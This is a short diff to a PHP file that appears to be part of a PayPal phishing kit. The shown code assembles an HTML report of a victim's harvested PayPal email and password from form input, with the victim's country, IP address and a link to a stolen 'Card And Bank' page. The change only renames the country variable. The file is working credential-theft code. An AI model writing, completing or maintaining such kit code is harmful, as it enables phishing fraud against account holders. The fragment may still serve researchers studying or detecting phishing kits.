@@ -76,7 +76,6 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
 
 //
 
-$CountryA = $IP_LOOKUP->country;
 $Z118_MESSAGE .= "
 
 <pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
@@ -88,7 +87,7 @@ $Z118_MESSAGE .= "
                                                                                                                                                                                                                                              
    <font style='color: rgb(128, 129, 131);'>&#10112; PP Email   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['login_email']."</font>
    <font style='color: rgb(128, 129, 131);'>&#10112; PP Password :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['login_password']."</font>
-<font style='color: rgb(128, 129, 131);'>&#10112; Country Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$CountryA."</font>
+<font style='color: rgb(128, 129, 131);'>&#10112; Country Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$LOOKUP_COUNTRY."</font>
    
       <font style='color: rgb(128, 129, 131);'>&#10112; More   :</font>  <font style='color: rgb(60, 118, 235);'> <a href = '../users/tnt2.html'>Card And Bank</a></font>
    <font style='color: rgb(128, 129, 131);'>&#10114; IP          :</font>  <font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_SERVER['REMOTE_ADDR']."'>".$_SERVER['REMOTE_ADDR']."</a></font> 
